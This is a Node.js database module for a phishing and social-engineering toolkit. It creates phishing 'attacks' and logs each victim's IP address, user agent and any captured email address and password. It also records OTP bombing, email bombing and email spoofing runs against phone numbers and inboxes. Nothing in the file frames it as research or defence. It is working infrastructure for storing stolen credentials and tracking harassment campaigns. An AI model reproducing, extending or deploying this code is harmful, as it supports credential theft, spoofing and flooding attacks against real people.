// simple JSON-backed database gateway
// provides the same functionality that earlier lived inside phishing.js

const fs = require('fs');
const path = require('path');

const DB_DIR = path.join(process.cwd(), 'db');
// rename old main database to new filename for clarity
const OLD_MAIN_DB_PATH = path.join(DB_DIR, 'maindb.json');
const MAIN_DB_PATH = path.join(DB_DIR, 'Socialengineering-db.json');
// attack directories are no longer used; keep constants for compatibility
const ATTACKS_DIR = path.join(DB_DIR, 'attacks');
const PHISHING_DIR = path.join(DB_DIR, 'phishing');

let mainDb = { username: '', password: '', chatid: '', attacks: [] };

function ensureDirs() {
    if (!fs.existsSync(DB_DIR)) fs.mkdirSync(DB_DIR, { recursive: true });
    // do not create attack subfolders anymore; all data lives in main DB
    // migrate old main database file if present
    if (fs.existsSync(OLD_MAIN_DB_PATH) && !fs.existsSync(MAIN_DB_PATH)) {
        try {
            fs.renameSync(OLD_MAIN_DB_PATH, MAIN_DB_PATH);
        } catch (e) {
            // ignore migration failure; we'll recreate below
        }
    }
}

function loadMain() {
    try {
        if (fs.existsSync(MAIN_DB_PATH)) {
            mainDb = JSON.parse(fs.readFileSync(MAIN_DB_PATH, 'utf8'));
        } else {
            saveMain();
        }
    } catch (err) {
        mainDb = { username: '', password: '', chatid: '', attacks: [] };
        saveMain();
    }
}

function saveMain() {
    fs.writeFileSync(MAIN_DB_PATH, JSON.stringify(mainDb, null, 2));
}

ensureDirs();
loadMain();
// migrate legacy per-attack JSON files into the main database structure
(function migrateAttackFiles() {
    if (!fs.existsSync(ATTACKS_DIR)) return;
    try {
        const files = fs.readdirSync(ATTACKS_DIR).filter(f => f.endsWith('.json'));
        files.forEach(f => {
            try {
                const data = JSON.parse(fs.readFileSync(path.join(ATTACKS_DIR, f), 'utf8'));
                if (!data.uuid) return;
                let entry = mainDb.attacks.find(a => a.uuid === data.uuid);
                if (!entry) {
                    // create a minimal metadata entry
                    entry = { uuid: data.uuid, datetime: data.createdAt || new Date().toISOString(), name: data.name || '', template: data.template || '', type: data.type || 'generic', logs: [] };
                    mainDb.attacks.push(entry);
                }
                entry.logs = Array.isArray(data.logs) ? data.logs.slice() : [];
            } catch (e) {
                // ignore individual file errors
            }
        });
        saveMain();
        // optionally remove legacy files now that data is migrated
        // Uncomment below lines to delete them permanently
        // files.forEach(f => fs.unlinkSync(path.join(ATTACKS_DIR, f)));
        // fs.rmdirSync(ATTACKS_DIR, { recursive: true });
    } catch (e) {
        // ignore migration failure
    }
})();

function createAttack({ uuid, datetime, name, template, type = 'generic' }) {
    // record the attack metadata in the main database; include logs array
    mainDb.attacks.push({ uuid, datetime, name, template, type, logs: [] });
    saveMain();
    // legacy directories are ignored; nothing written to ATTACKS_DIR/PHISHING_DIR
}

function logAttackVisit(uuid, { ip, useragent, filename, ts, email, password }) {
    // normalize IPv4-mapped addresses
    if (ip && typeof ip === 'string' && ip.startsWith('::ffff:')) {
        ip = ip.split(':').pop();
    }
    // find the attack entry in mainDb and append log
    const attack = mainDb.attacks.find(a => a.uuid === uuid);
    if (!attack) return;
    attack.logs = Array.isArray(attack.logs) ? attack.logs : [];
    const entry = { ip, useragent, filename, timestamp: ts, at: new Date(ts).toISOString() };
    if (email) entry.email = email;
    if (password) entry.password = password;
    attack.logs.push(entry);
    attack.lastUsed = new Date(ts).toISOString();
    saveMain();
}

// return array of log entries for an attack (empty if none/unknown)
function getAttackLogs(uuid) {
    const attack = mainDb.attacks.find(a => a.uuid === uuid);
    if (!attack) return [];
    return Array.isArray(attack.logs) ? attack.logs : [];
}

// retrieve the list of attacks, optionally filtered by type
function getAttacks(type) {
    if (!Array.isArray(mainDb.attacks)) return [];
    if (type) {
        return mainDb.attacks.filter(a => a.type === type);
    }
    return mainDb.attacks.slice();
}

// ------------ bombing history support -------------

function logOtpBomb({ datetime, mobile, total, sent }) {
    if (!Array.isArray(mainDb.otpLogs)) mainDb.otpLogs = [];
    mainDb.otpLogs.push({ datetime, mobile, total, sent });
    saveMain();
}

function logEmailBomb({ datetime, email, total, sent }) {
    if (!Array.isArray(mainDb.emailLogs)) mainDb.emailLogs = [];
    mainDb.emailLogs.push({ datetime, email, total, sent });
    saveMain();
}

function getOtpLogs() {
    return Array.isArray(mainDb.otpLogs) ? mainDb.otpLogs.slice() : [];
}

function getEmailLogs() {
    return Array.isArray(mainDb.emailLogs) ? mainDb.emailLogs.slice() : [];
}

function logEmailSpoof({ datetime, from, to, subject, status }) {
    if (!Array.isArray(mainDb.spoofLogs)) mainDb.spoofLogs = [];
    mainDb.spoofLogs.push({ datetime, from, to, subject, status });
    saveMain();
}

function getEmailSpoofLogs() {
    return Array.isArray(mainDb.spoofLogs) ? mainDb.spoofLogs.slice() : [];
}

module.exports = {
    createAttack,
    logAttackVisit,
    getAttackLogs,
    getAttacks,
    // bombing logs
    logOtpBomb,
    logEmailBomb,
    logEmailSpoof,
    getOtpLogs,
    getEmailLogs,
    getEmailSpoofLogs
};
